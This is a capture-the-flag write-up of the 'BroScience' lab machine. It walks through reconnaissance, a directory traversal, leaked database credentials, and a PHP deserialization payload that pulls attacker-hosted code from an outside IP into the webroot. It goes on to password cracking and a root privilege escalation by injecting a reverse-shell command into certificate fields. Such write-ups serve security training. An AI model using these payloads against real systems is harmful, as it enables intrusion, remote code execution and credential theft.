# Bro Science

## IP = 10.10.11.195

### Initial
```
# Nmap 7.92 scan initiated Fri Mar 24 15:36:42 2023 as: nmap -sC -sV -oN nmap/initial 10.10.11.195
Nmap scan report for broscience.htb (10.10.11.195)
Host is up (0.074s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)
|   256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)
|_  256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
|_http-server-header: Apache/2.4.54 (Debian)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: BroScience : Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster
```
/.php                 (Status: 403) [Size: 280]
/images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/]
/index.php            (Status: 200) [Size: 9304]
/login.php            (Status: 200) [Size: 1936]
/register.php         (Status: 200) [Size: 2161]
/user.php             (Status: 200) [Size: 1309]
/comment.php          (Status: 302) [Size: 13] [--> /login.php]
/includes             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/]
/manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/]
/javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/]
/activate.php         (Status: 200) [Size: 1256]
/exercise.php         (Status: 200) [Size: 1322]
/.php                 (Status: 403) [Size: 280]
```

### Apache 2.4

Possible users:
- administrator
- michael
- john
- dmytro

### Directory Traversal in: `/includes/img.php?path=...`. Just double encode
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

### db_connect.php
```
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

### HTML injection in index.php


### ../includes/utils.php
```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

...

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath;

    public function __construct($imgPath, $tmp) {
        $this->imgPath = $imgPath;
        $this->tmp = $tmp;
    }

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```

### Arbitrary write with `unserialize` and `__wakeup()`
Payload example: `O:15:"AvatarInterface":2:{s:3:"tmp";s:11:"/etc/passwd";s:7:"imgPath";s:13:"/tmp/ciao.txt";}`

### file_get_contents() can also make external calls
1. Set: `O:15:"AvatarInterface":2:{s:3:"tmp";s:31:"http://10.10.16.51:8000/AAA.php";s:7:"imgPath";s:21:"/var/www/html/AAA.php";}`
2. Search `http://broscience.htb/AAA.php`

### Login in in PostgreSQL
`psql -h localhost -p 5432 -d broscience -U dbuser`

### Dump all users and crack it
`john -form=dynamic='md5($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`, found `bill:iluvhorsesandgym`

### Bill used the same password, user.txt

---

### pspy64
```
2023/03/29 09:30:01 CMD: UID=0     PID=25397  | /usr/sbin/CRON -f 
2023/03/29 09:30:01 CMD: UID=0     PID=25398  | /bin/sh -c /root/webappreset.sh 
2023/03/29 09:30:01 CMD: UID=0     PID=25399  | /bin/sh -c /root/cron.sh 
2023/03/29 09:30:01 CMD: UID=0     PID=25400  | /bin/bash /root/webappreset.sh 
2023/03/29 09:30:01 CMD: UID=0     PID=25401  | /bin/sh -c /root/dbreset.sh 
2023/03/29 09:30:01 CMD: UID=0     PID=25402  | /bin/bash /root/cron.sh 
2023/03/29 09:30:01 CMD: UID=0     PID=25403  | /bin/bash /root/dbreset.sh 
2023/03/29 09:30:01 CMD: UID=0     PID=25405  | /usr/bin/cp -R /root/webapp /var/www/html 
2023/03/29 09:30:01 CMD: UID=0     PID=25404  | 
2023/03/29 09:30:01 CMD: UID=0     PID=25406  | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt 
2023/03/29 09:30:01 CMD: UID=0     PID=25407  | /bin/bash /root/webappreset.sh 
2023/03/29 09:30:01 CMD: UID=0     PID=25408  | /bin/bash /root/cron.sh 
2023/03/29 09:30:01 CMD: UID=0     PID=25409  | /bin/bash /root/cron.sh
```

### `timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt ` run every 2 minutes
1. Create a revshell in `/dev/shm/rev.sh`
2. Generate an expired certificare: `faketime 'last friday 5 pm' /bin/bash -c 'openssl req -x509 -newkey rsa:4096 -keyout temp.key -out broscience.crt -sha256 -days 1 -nodes'`
3. Sets all fields to `/bin/bash /dev/shm/rev.sh`
4. After 2 minutes, among all the instructions, root will execute:
```2023/03/29 10:04:02 CMD: UID=0     PID=25887  | /bin/bash -c mv /tmp/temp.crt /home/bill/Certs/`/bin/bash /dev/shm/rev.sh`.crt```

### root.txt